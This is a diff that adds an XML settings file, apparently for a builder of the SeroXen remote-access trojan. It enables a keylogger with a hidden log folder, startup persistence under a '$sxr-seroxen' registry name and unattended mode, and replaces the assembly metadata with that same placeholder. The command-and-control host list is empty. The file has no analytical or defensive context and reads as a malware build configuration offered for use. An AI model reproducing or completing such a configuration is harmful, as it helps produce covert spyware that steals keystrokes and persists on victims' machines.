@@ -1,0 +1,34 @@
+<settings>
+  <Tag>SeroXen</Tag>
+  <Hosts>
+  </Hosts>
+  <Delay>3000</Delay>
+  <Mutex>
+  </Mutex>
+  <UnattendedMode>True</UnattendedMode>
+  <InstallClient>False</InstallClient>
+  <InstallName>
+  </InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>
+  </InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>$sxr-seroxen</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>$sxr-seroxen</ProductName>
+  <Description>$sxr-seroxen</Description>
+  <CompanyName>$sxr-seroxen</CompanyName>
+  <Copyright>$sxr-seroxen</Copyright>
+  <Trademarks>$sxr-seroxen</Trademarks>
+  <OriginalFilename>$sxr-seroxen</OriginalFilename>
+  <ProductVersion>1.4.1.2</ProductVersion>
+  <FileVersion>1.4.1.2</FileVersion>
+</settings>
